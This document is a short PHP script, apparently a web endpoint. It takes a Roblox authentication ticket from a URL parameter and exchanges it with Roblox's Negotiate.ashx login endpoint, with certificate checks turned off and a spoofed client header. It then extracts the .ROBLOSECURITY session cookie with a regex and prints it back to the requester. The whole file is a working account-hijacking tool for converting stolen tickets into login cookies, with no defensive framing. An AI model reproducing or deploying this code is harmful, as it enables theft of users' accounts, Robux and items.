<?php
    $ticket = htmlspecialchars($_GET["suggest"]);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/Login/Negotiate.ashx?suggest=".$ticket);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'User-Agent: Roblox/WinInet',
        'RBXAuthenticationNegotiation: https://www.roblox.com/'
    ));
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    
    $pattern = "/_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[\w\d]+/i";
    preg_match($pattern, $output, $cookie);
    // $cookie = $cookie[0];
    print_r( implode($cookie) );
    
    curl_close($ch);
?>